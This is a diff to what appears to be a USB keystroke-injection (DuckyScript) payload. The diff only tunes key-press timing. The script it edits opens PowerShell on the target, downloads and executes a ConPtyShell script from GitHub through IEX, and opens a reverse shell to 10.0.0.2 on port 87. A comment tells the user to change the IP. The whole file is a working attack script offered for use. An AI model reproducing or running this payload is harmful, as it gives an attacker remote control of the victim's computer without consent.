@@ -27,7 +27,7 @@ DELAY 100
 TAB
 DELAY 100
 SPACE
-DELAY 500
+DELAY 1000
 TAB
 DELAY 100
 TAB
@@ -36,6 +36,8 @@ TAB
 DELAY 100
 TAB
 DELAY 100
+SPACE
+DELAY 1000
 SPACE
 REM if you need administrator [delay 500 and alt y]
 DELAY 500
@@ -50,6 +52,8 @@ DELAY 100
 REM execute powershell command to start reverse shell script [don't forget to change IP]
 STRING powershell 
 ENTER
+DELAY 300
 STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 87
 DELAY 200
 ENTER
+DELAY 200
